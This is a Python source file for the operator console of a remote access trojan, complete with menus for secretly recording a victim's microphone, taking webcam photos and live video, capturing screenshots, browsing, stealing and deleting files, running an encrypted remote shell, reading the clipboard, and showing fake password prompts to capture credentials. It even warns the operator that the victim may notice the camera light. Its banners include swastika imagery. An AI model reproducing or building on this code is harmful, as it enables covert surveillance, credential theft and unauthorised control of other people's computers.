import socket
from PIL import Image
import cv2
from numpy import array 
import numpy as np
from json import loads,dumps,JSONDecodeError
import wave
from time import sleep
from platform import system as osType
from colorama import Fore,Back
from os.path import isfile
from os import system , getcwd
from cryptography.fernet import Fernet
from random import choice
def clear():
    if "windows" in osType().lower():
        system("cls")
    else :
        system("clear")
def decryptFS(dataBorS,key):
    if not type(dataBorS)==bytes:
        dataBorS=str(dataBorS).encode()
    if dataBorS:
        Eobj=Fernet(key)
        res=Eobj.decrypt(dataBorS)
        return res
def encryptFS(dataBorS,key):
    if not type(dataBorS)==bytes:
        dataBorS=str(dataBorS).encode()
    if dataBorS:
        Eobj=Fernet(key)
        res=Eobj.encrypt(dataBorS)
        return res
def clearBuffer(sock):
    sock.settimeout(0.5)
    while 1:
        try:
            sock.recv(1000000)
        except socket.timeout :
            break
def others(sock):
    clear()
    def funAlert():
        imagePath=input(f"{Fore.LIGHTGREEN_EX}Choose an image for alert (you can find good images in the images folder!)\n\nEnter image file path : {Fore.RESET}")
        if isfile(imagePath):
            Oimg=Image.open(imagePath)
            sock.send("HDalert".encode())
            dumpList=dumps(array(Oimg).tolist())
            sock.send(dumpList.encode())
            sock.send(b"END")
            input(f"{Fore.LIGHTGREEN_EX}[ * ] Done !\n\nEnter to continue : ")
        else:
            input(f"{Fore.LIGHTRED_EX}Error : {imagePath} No such file !\n\nEnter to continue : {Fore.RESET}")
    def systemInfo():
        sock.send("Sinfo".encode())
        info=sock.recv(4098).decode().split("|")
        print(f"Disk usage : {info[0]}\nMemory info : {info[1]}\n\nMachine : {info[2]}\nVersion : {info[3]}\nPlatform : {info[4]}\nProcessor : {info[5]}")
        input(f"{Fore.LIGHTGREEN_EX}[ * ] Done !\n\nEnter to continue : ")

    selection=input(f"""
                                     {Fore.LIGHTGREEN_EX} __________________________
                                     {Fore.LIGHTGREEN_EX}|                          |{Fore.YELLOW}          _
{Fore.YELLOW}              _..----.._    _        {Fore.LIGHTGREEN_EX}|{Fore.LIGHTCYAN_EX}  [ 1 ] Fun hacked alert {Fore.LIGHTGREEN_EX} |{Fore.YELLOW}       ,-(_)-\"\"\"\"\"--,,
{Fore.YELLOW}            .'  .--.    "-.(0)_      {Fore.LIGHTGREEN_EX}|                          |{Fore.YELLOW}     <  0             ";===""==,.
{Fore.YELLOW}'-.__.-'"'=:|   ,  _)_ \__ . c\\'-..  {Fore.LIGHTGREEN_EX}|  {Fore.LIGHTCYAN_EX}[ 2 ] Target system info{Fore.LIGHTGREEN_EX}|{Fore.YELLOW}      `-../ )__... (  ,'        "==
{Fore.YELLOW}             '''------'---''---'-"   {Fore.LIGHTGREEN_EX}|__________________________|{Fore.YELLOW}       ==="    ,,==="   


{Fore.LIGHTYELLOW_EX}Enter your selection : {Fore.RESET}""")
    if selection=="1":
        funAlert()
    elif selection=="2":
        systemInfo()
def popup(sock):
    clearBuffer(sock)
    sock.settimeout(None)
    selection=input(f"""
{Fore.MAGENTA}    0_
{Fore.MAGENTA}       \`.     ___
{Fore.MAGENTA}    /\  \ \   / __>0
{Fore.MAGENTA}   /  \/   `  ,`'--.
{Fore.MAGENTA}  / /(___________)_ \\           
{Fore.MAGENTA}  |/ //.-.   .-.\\ \ \\
{Fore.LIGHTGREEN_EX}  0 // :@ {Fore.LIGHTRED_EX}___{Fore.RESET}{Fore.LIGHTGREEN_EX} @: \\ \/
{Fore.LIGHTGREEN_EX}    ( o ^{Fore.LIGHTRED_EX}(___){Fore.RESET}{Fore.LIGHTGREEN_EX}^ o ) 0 
{Fore.LIGHTGREEN_EX}     \ \_______/ /
{Fore.LIGHTGREEN_EX} /\   '._______.'--.
{Fore.LIGHTGREEN_EX} \ /|  |<_____>    |
{Fore.LIGHTGREEN_EX}  \ \__|<_____>____/|__     [ 1 ] Alert window         [ 2 ] Confirm window
{Fore.LIGHTGREEN_EX}   \____<_____>_______/ 
{Fore.LIGHTGREEN_EX}       :<_____>____:        [ 3 ] Question window      [ 4 ] Password window
{Fore.LIGHTGREEN_EX}      / <_____>   /|
{Fore.LIGHTGREEN_EX}     /  <_____>  / |
{Fore.LIGHTGREEN_EX}    /___________/  |
{Fore.LIGHTGREEN_EX}    |           | _|__
{Fore.LIGHTGREEN_EX}    |           | ---||_
{Fore.LIGHTGREEN_EX}    |   {Fore.LIGHTRED_EX}PoPuP!{Fore.RESET}{Fore.LIGHTGREEN_EX}  |  / [__]
{Fore.LIGHTGREEN_EX}    |___________|/
    
        {Fore.LIGHTCYAN_EX}Enter your selection : {Fore.RESET}""")
    if selection=="1":
        while 1:
            title=input(f"{Fore.LIGHTYELLOW_EX}Enter the window title (MAX 10 char): ").replace('|','')
            if len(title)<=10:
                break
            else:
                print(f"{Fore.LIGHTRED_EX}Error : MAX 10 char{Fore.RESET}")
        while 1:
            text=input(f"\nEnter the window text (MAX 30 char): {Fore.RESET}").replace('|','')
            if len(title)<=30:
                break
            else:
                print(f"{Fore.LIGHTRED_EX}Error : MAX 10 char{Fore.RESET}")
        sock.sendall(f"WNalert|{title}|{text}".encode())
    elif selection=="2":
        while 1:
            title=input(f"{Fore.LIGHTYELLOW_EX}Enter the window title (MAX 10 char): ").replace('|','')
            if len(title)<=10:
                break
            else:
                print(f"{Fore.LIGHTRED_EX}Error : MAX 10 char{Fore.RESET}")
        while 1:
            text=input(f"\nEnter the window text (MAX 30 char): {Fore.RESET}").replace('|','')
            if len(title)<=30:
                break
            else:
                print(f"{Fore.LIGHTGREEN_EX}Error : MAX 10 char{Fore.RESET}")
        print(f"{Fore.LIGHTGREEN_EX}Enter the buttons text(Enter CTRL+C to finish)\nNOTE:Max=5")
        buttons=''
        for i in range(5):
            try:
                while 1:
                    btxt=(input(f"\n{Fore.LIGHTCYAN_EX}Enter the button {i+1} text (MAX 10 char): {Fore.RESET}").replace(',',''))+','
                    if len(btxt)<=10:
                        buttons+=btxt
                        break
                    else :
                        print(f"{Fore.LIGHTRED_EX}Error : MAX 10 char{Fore.RESET}")
            except KeyboardInterrupt:
                buttons=buttons.strip()[0:len(buttons)-1]
                if len(buttons):
                    print(f"\n\n{Fore.LIGHTGREEN_EX}Please wait for the target to click a button ...{Fore.RESET}")
                    break
                else:
                    print(f"{Fore.LIGHTRED_EX}Error : You must enter at least one button")
                    while 1:
                        btxt=(input(f"\n{Fore.LIGHTCYAN_EX}Enter the button 1 text (MAX 10 char): {Fore.RESET}").replace(',',''))+','
                        if len(btxt)<=10:
                            buttons+=btxt
                            break
                    else :
                        print(f"{Fore.LIGHTRED_EX}Error : MAX 10 char{Fore.RESET}")
        sock.sendall(f"WNconfr|{title}|{text}|{buttons.replace('|','')}".encode())
        resault=sock.recv(2048)
        print(f"\n\n{Fore.LIGHTRED_EX}The target clicked the {Fore.LIGHTGREEN_EX}{resault.decode()}{Fore.LIGHTRED_EX} button !{Fore.RESET}")
        input(f"\n\n{Fore.LIGHTCYAN_EX}Enter to continue : {Fore.RESET}")
    elif selection=='3' or selection=='4':
        print(f'{Fore.LIGHTRED_EX}If the user does not enter a response or cancels the window\n the tool will freeze, so if it takes too long, enter CTRL + C to exit.{Fore.RESET}')
        while 1:
            title=input(f"{Fore.LIGHTYELLOW_EX}Enter the window title (MAX 10 char): ").replace('|','')
            if len(title)<=10:
                break
            else:
                print(f"{Fore.LIGHTRED_EX}Error : MAX 10 char{Fore.RESET}")
        while 1:
            text=input(f"\nEnter the window text (MAX 30 char): {Fore.RESET}").replace('|','')
            if len(title)<=30:
                break
            else:
                print(f"{Fore.LIGHTGREEN_EX}Error : MAX 10 char{Fore.RESET}")
        if selection=='3':
            sock.sendall(f"WNqstion|{title}|{text}".encode())
        else:
            sock.sendall(f"WNpasswd|{title}|{text}".encode())
        print(f"\n\n{Fore.LIGHTGREEN_EX}Please wait for the target to enter some value ...{Fore.RESET}")
        resault=sock.recv(1000000).decode().replace("END","")
        if resault:
            print(f"\n\n{Fore.LIGHTRED_EX}Target entered : \n{Fore.LIGHTGREEN_EX}{resault}\n{Fore.RESET}")
            input(f"\n\n{Fore.LIGHTCYAN_EX}Enter to continue : {Fore.RESET}")
def shell(sock,key):
    key=key.encode()
    sock.send("RMCM".encode())
    while 1:
        sock.send(encryptFS("GTINFO",key))
        info=decryptFS(sock.recv(1024),key).decode()
        command=input(f"{Fore.LIGHTRED_EX}{socket.gethostname()}@{Fore.LIGHTGREEN_EX}{info}>{Fore.LIGHTCYAN_EX}")
        if command:
            sock.send(encryptFS(command,key))
            res=decryptFS(sock.recv(10240),key).decode()
            if not res=="None":
                print(res)
def RWclip(sock):
    clear()
    selection=input(f"""
{Fore.LIGHTRED_EX}    ██████╗     ██╗██╗    ██╗
    ██╔══██╗   ██╔╝██║    ██║
    ██████╔╝  ██╔╝ ██║ █╗ ██║{Fore.RESET}{Fore.LIGHTCYAN_EX}┌─┐┬  ┬┌─┐┌┐ ┌─┐┌─┐┬─┐┌┬┐
    {Fore.LIGHTRED_EX}██╔══██╗ ██╔╝  ██║███╗██║{Fore.RESET}{Fore.LIGHTCYAN_EX}│  │  │├─┘├┴┐│ │├─┤├┬┘ ││
    {Fore.LIGHTRED_EX}██║  ██║██╔╝   ╚███╔███╔╝{Fore.RESET}{Fore.LIGHTCYAN_EX}└─┘┴─┘┴┴  └─┘└─┘┴ ┴┴└──┴┘
    {Fore.LIGHTRED_EX}╚═╝  ╚═╝╚═╝     ╚══╝╚══╝ {Fore.RESET}
{Fore.LIGHTMAGENTA_EX}
    [ 1 ] Read the clipboard    [ 2 ] Write on the clipboard

    [ E ] CTRL+C to exit

    {Fore.LIGHTBLUE_EX}Enter your selection : {Fore.RESET}""")
    if selection=="1":
        sock.send(b"GCLPB")
        data=''
        while 1:
            data2=sock.recv(100000).decode()
            if "ENDeyeRT" in data2:
                data+=data2.replace("ENDeyeRT",'')
                break
            data+=data2
        input(f"{Fore.LIGHTRED_EX}[ * ] Done : \n\n{Fore.LIGHTGREEN_EX}{data}\n\nEnter to continue :")
    elif selection=="2":
        print(f"{Fore.LIGHTYELLOW_EX}[ * ] Enter the data ('ctrl+c' to end) : \n")
        data=''
        try:
            while 1:
                data+=input("> ")+'\n'
        except KeyboardInterrupt:
            pass
        sock.send(b"WCLPB")
        sleep(0.5) 
        sock.send((data.strip()+"ENDeyeRT").encode())
        input(f"{Fore.LIGHTGREEN_EX}[ * ] Done ...\n\nEnter to continue : ")
def getFex(sock):
    clear()
    clearBuffer(sock)
    sock.settimeout(None)
    slcn=input(f"""{Fore.YELLOW}
                    .----.______
                    |File       |
                    |    ___________
                    |   /          /
                    |  /          /
                    | /   (ಠ_ಠ)  /
                    |/__________/{Fore.RESET}


{Fore.LIGHTGREEN_EX}[ 1 ] Search in current path{Fore.RESET}      {Fore.LIGHTGREEN_EX}[ 2 ] Redirect{Fore.RESET}

{Fore.LIGHTGREEN_EX}[ 3 ] Current path files{Fore.RESET}          {Fore.LIGHTGREEN_EX}[ 4 ] Edit file{Fore.RESET}

{Fore.LIGHTGREEN_EX}[ 5 ] Download file       {Fore.RESET}        {Fore.LIGHTGREEN_EX}[ 6 ] Remove file/folder{Fore.RESET}

{Fore.LIGHTGREEN_EX}[ 7 ] Upload file{Fore.RESET}

{Fore.LIGHTCYAN_EX}Enter your selection : """)
    print(Fore.RESET)
    if slcn=="1":
        filename="FXshf:"
        filename+=input(f"{Fore.MAGENTA}Enter the file name : {Fore.RESET}")
        sock.send(filename.encode())
        sleep(0.5)
        files=sock.recv(1024).decode().replace("END",'')
        print(f"{Fore.LIGHTCYAN_EX}Result : {Fore.LIGHTGREEN_EX}{files}")
        input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
    elif slcn=="2":
        path="FXchd:"
        path+=input(f"{Fore.MAGENTA}Enter the path : {Fore.RESET}")
        sock.send(path.encode())
        sleep(0.5)
        res=sock.recv(1024).decode().replace("END",'')
        print(f"{Fore.LIGHTCYAN_EX}Result : {Fore.LIGHTGREEN_EX}{res}")
        input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
    elif slcn=="3":
        filename="FXshf:"
        sock.send(filename.encode())
        sleep(0.5)
        files=sock.recv(1024).decode().replace("END",'')
        print(f"{Fore.LIGHTCYAN_EX}Result : {Fore.LIGHTGREEN_EX}{files}")
        input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
    elif slcn=="5" or slcn=='4':
        buffer = 4096
        if slcn=='4':
            path="4FXdwn:"
        else :
            path="FXdwn:"
        path+=input(f"{Fore.MAGENTA}Enter the file path : {Fore.RESET}")
        sock.send(path.encode())
        if '\\' in path:
            filename=path.split("\\")
            filename=filename[len(filename)-1]
        elif '/' in path:
            filename=path.split("/")
            filename=filename[len(filename)-1]
        else : 
            filename=path
        if slcn=='5':
            filesize=sock.recv(1024).decode()
            try:
                int(filesize)
            except ValueError:
                print(f"\n\n{Fore.LIGHTCYAN_EX}Resault : {Fore.RESET}",filesize)
                input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
                return 1
            
        if slcn=='4':
            sock.settimeout(2)
        with open(filename.split(":")[1] ,"wb") as f:
            while 1:
                try:
                    data=sock.recv(buffer)
                except socket.timeout:
                    break
                if "END" in str(data[len(data)-3:]) :
                    data=data[0:(len(data)-3)]
                    f.write(data)    
                    break
                if not data :
                    break
                f.write(data)
            f.close()
        if slcn == '4':
            input(f"\n\n{Fore.LIGHTCYAN_EX}Enter to commit changes :{Fore.RESET}")
            filePath=filename
            buffer=4096
            try:
                with open(filePath.split(":")[1],"rb") as BFile:
                    while 1:
                        rdata=BFile.read(buffer)
                        if not rdata:
                            break
                        sock.sendall(rdata)
                    sock.send(b"END")
            except FileNotFoundError:
                input(f"{Fore.RED}{Back.BLACK}Can't find {filename},Why did you delete it ?!\n\n{Fore.LIGHTCYAN_EX}Enter to continue : {Fore.RESET}{Back.RESET}")

    elif slcn=="6":
        filename="FXrmf:"
        filename+=input("Enter file name : ")
        sock.send(filename.encode())
        print(f"\n\n{Fore.LIGHTCYAN_EX}Resault : {Fore.RESET}",sock.recv(1024).decode())
        input(f"\n\n{Fore.LIGHTRED_EX}Enter to continue : {Fore.RESET}")
    elif slcn=="7":
        buffer=4096
        filePath="FXupd:"
        filePath+=input(f"{Fore.MAGENTA}Enter the file path in the target system : {Fore.RESET}")
        Ufile=input(f"{Fore.LIGHTCYAN_EX}\nEnter the path of the file you want to upload : ")
        sock.send(filePath.encode())
        try:
            with open(Ufile,"rb") as BFile:
                while 1:
                    rawData=BFile.read(buffer)
                    if not rawData:
                        sock.send(b"END")    
                        return 1
                    sock.sendall(rawData)
        except FileNotFoundError :
            print(f"{Fore.RED}Can't open file : {Ufile} {Fore.RESET}")


def getScr(sock):
    data=''
    while 1:    
        data2=sock.recv(8388608).decode()
        if "END" in data2:
            data2=data2.replace("END",'')
            data+=data2
            break
        elif data2.strip() :
            data+=data2
        else:
            break
    if data:
        CVimg=array(loads(data)).astype(np.uint8)
        img=Image.fromarray(CVimg)
        img.save("screenshot.jpg")
def getPict(sock):
    
    data=''
    while 1:    
        data2=sock.recv(8388608).decode()
        if data2.strip() :
            if 'END' in str(data2):
                if len(data2) > 3:
                    data+=(data2[0:(len(data2)-3)])
                break
            data+=data2
        else:
            break
    if data:
        data=data.replace("END","")
        frame=array(loads(data))
        cv2.imwrite("image.jpg",frame)
def getLive(sock):
    try:
        while 1:
            data=''
            while 1:
                data+=sock.recv(8388608).decode()
                if "END" in data:
                    data=data.split("END")[0]
                    break
            sock.send(b"cnt")
            try:
                frame=array(loads(data), dtype=np.uint8)
                cv2.imshow('LIVE(Insert the CTRL-c to exit)',frame)
            except JSONDecodeError:
                pass
            if cv2.waitKey(1) & 0xFF == ord('q'):
                sock.send(b"end")
                break
    except KeyboardInterrupt :
        cv2.destroyAllWindows()
        sock.send(b"end")
        return True
def getSound(sock,sec):
    sock.send(str(sec).encode())
    fs = 44100
    wf = wave.open("Voice.wav", 'wb')
    wf.setnchannels(2)
    data_01=int(sock.recv(1024).decode())
    wf.setsampwidth(data_01)
    wf.setframerate(fs)
    frames=[]
    while 1:
        data_02=sock.recv(40000)
        if 'END' in str(data_02):
            
            if len(data_02) > 3:
                frames.append(data_02[0:(len(data_02)-3)])
            break
        frames.append(data_02)
    wf.writeframes(b''.join(frames))
    wf.close()
def main(mode):
    host=input(f'{Fore.LIGHTYELLOW_EX}\n[*] Enter the host : {Fore.RESET}')
    clear()
    while 1:
        try:
            port=int(input(f'\n{Fore.LIGHTYELLOW_EX}[*]Enter the port : {Fore.RESET}'))
            clear()
            break
        except ValueError:
            pass
    sock=socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    try:
        if mode=="server":
            while 1:
                try:
                    lstnNum=int(input(f'{Fore.LIGHTYELLOW_EX}\n[*]Enter the listen number : {Fore.RESET}'))
                    break
                except ValueError:
                    pass
            sock.bind((host,port))
            sock.listen(lstnNum)
            print(f"{Fore.LIGHTGREEN_EX}\n\n[ * ] Waiting for the client ...{Fore.RESET}")
            sock,addr=sock.accept()
        elif mode =="client":
            sock.connect((host,port))
            
    except :
        print(rf'''
{Fore.LIGHTYELLOW_EX}    .-.                                {Fore.LIGHTGREEN_EX}_________{Fore.RESET}
{Fore.LIGHTYELLOW_EX}   / _ \                              {Fore.LIGHTGREEN_EX}|{Fore.RESET}  {Fore.RED}Error{Fore.RESET}  {Fore.LIGHTGREEN_EX}|{Fore.RESET}
{Fore.LIGHTYELLOW_EX}  | ' ) |                  {Fore.LIGHTGREEN_EX}+----------+---------+-----------+{Fore.RESET}
{Fore.LIGHTYELLOW_EX}   `-' /                   {Fore.LIGHTGREEN_EX}|{Fore.RESET} {Fore.RED}Error communicating with rat,{Fore.RESET}  {Fore.LIGHTGREEN_EX}|{Fore.RESET}
{Fore.LIGHTYELLOW_EX}    / /  .                 {Fore.LIGHTGREEN_EX}|{Fore.RESET} {Fore.RED}please try agin ...{Fore.RESET}            {Fore.LIGHTGREEN_EX}|{Fore.RESET}
{Fore.LIGHTYELLOW_EX}  .' /  / `.               {Fore.LIGHTGREEN_EX}+--------------------------------+{Fore.RESET}
{Fore.LIGHTYELLOW_EX}  | |  |  __\              .
   \ \ |_/ {Fore.RED}cc{Fore.LIGHTYELLOW_EX}`.           //
    \ .'_    __O         //
     /\(%)_ ' \         //
    .--.8bo._./\       //
   /    \88888\8\     //
  |  _   |88888\8\   //
  | (_)  |888888\8\\//
  |      |=(卐)==\/ X\
   \    /88888888'\/
   |`--'888888888 /
   |.' \      .'`/.
    `___)x/\x(__/_`
    ///__/__\___\\\ {Fore.RESET}''')
        exit()
    while 1:
        clearBuffer(sock)
        sock.settimeout(None)
        clear()
        selection=input(rf"""{Fore.RESET}
         {Fore.CYAN}____                                                                   {Fore.RESET}
        {Fore.CYAN}|{Fore.RESET}{Back.RED} {Fore.BLACK}卐{Fore.RESET} {Back.RESET}|                                                              
        {Fore.CYAN}|{Fore.RESET}{Back.RED}____{Back.RESET}|                                                              
       {Fore.CYAN}_|{Fore.RESET}{Back.RED}____{Back.RESET}|_ 
        {Fore.CYAN}/ 00 \_
      {Fore.CYAN}.'     __0{Fore.RESET}       {Fore.LIGHTGREEN_EX}[ 1 ] Voice recording{Fore.RESET}          {Fore.LIGHTGREEN_EX}[ 2 ] Take photo{Fore.RESET}
     {Fore.CYAN}/   .-.' \
    {Fore.CYAN}J    |`.\  \{Fore.RESET}       {Fore.LIGHTGREEN_EX}[ 3 ] Live{Fore.RESET}                     {Fore.LIGHTGREEN_EX}[ 4 ] Take screenshot {Fore.RESET}
    {Fore.CYAN}| |_.|  | | |
     {Fore.CYAN}\__.'`.|-' /{Fore.RESET}      {Fore.LIGHTGREEN_EX}[ 5 ] File explorer {Fore.RESET}           {Fore.LIGHTGREEN_EX}[ 6 ] CLI remote command shell {Fore.RESET}
     {Fore.CYAN}L      `--'\{Fore.RESET}
    {Fore.CYAN} |           \{Fore.RESET}     {Fore.LIGHTGREEN_EX}[ 7 ] Make custom popup box{Fore.RESET}    {Fore.LIGHTGREEN_EX}[ 8 ] Read/write clipboard{Fore.RESET} 
    {Fore.CYAN} J            \{Fore.RESET}
    {Fore.CYAN}  \         /  \{Fore.RESET}   {Fore.LIGHTGREEN_EX}[ 9 ] Other{Fore.RESET}                
     {Fore.CYAN}  \      .'`.  `.                                  .'
     ___) /\ (____`.  `-._____________________________.'/
  _///__/__\___\\\_`-.______________________________.-'___
  /                                                        \
 /     Please select a command to send to the RAT           \
/____________________________________________________________\{Fore.RESET}

Enter your selection : """)
        
        if selection=='1':
            print(f"{Fore.YELLOW}[*] Sending command to RAT .\nPlease wait while the process of sending, receiving and executing the order may take some time .{Fore.RESET}")
            sock.send("Rsound".encode())
            sleep(0.25)
            sec=input(f"{Fore.LIGHTYELLOW_EX}\n[*]Please enter the recording time (seconds) : {Fore.RESET}")
            getSound(sock,sec)
        elif selection=='2':
            print(f"{Fore.YELLOW}[*] Sending command to RAT .\nPlease wait while the process of sending, receiving and executing the order may take some time .{Fore.RESET}")
            sock.send("Tpict".encode())
            sleep(1)
            getPict(sock)
        elif selection=='3':
            selection=input(f"{Fore.RED}{Back.BLACK}[W] Warning If you use this option for a long time, the victim may notice\n that the device is infected due to the camera light coming on\n\nDo you want to continue[N/y] ? {Fore.RESET}{Back.RESET}")
            if selection.lower() =='y':
                print(f"{Fore.YELLOW}[*] Sending command to RAT .{Fore.RESET}")
                sock.send("Glive".encode())
                sleep(1)
                getLive(sock)
        elif selection=='4':
            print(f"{Fore.YELLOW}[*] Sending command to RAT .\nPlease wait while the process of sending, receiving and executing the order may take some time .{Fore.RESET}")
            sock.send("Tscr".encode())
            sleep(1)
            getScr(sock)
        elif selection=='5':
            try:
                while 1:
                    getFex(sock)
            except KeyboardInterrupt :
                pass
        elif selection=='6':
            clear()
            key=input(f"{Fore.LIGHTBLUE_EX}Enter the encryption / decryption token : {Fore.RESET}")
            try:
                shell(sock,key)
            except KeyboardInterrupt:
                sock.send(encryptFS("END",key))
        elif selection=='7':
            clear()
            try:
                popup(sock)
            except KeyboardInterrupt:
                pass
        elif selection=='8':
            RWclip(sock)
        elif selection=='9':
            try:
                others(sock)
            except KeyboardInterrupt:
                pass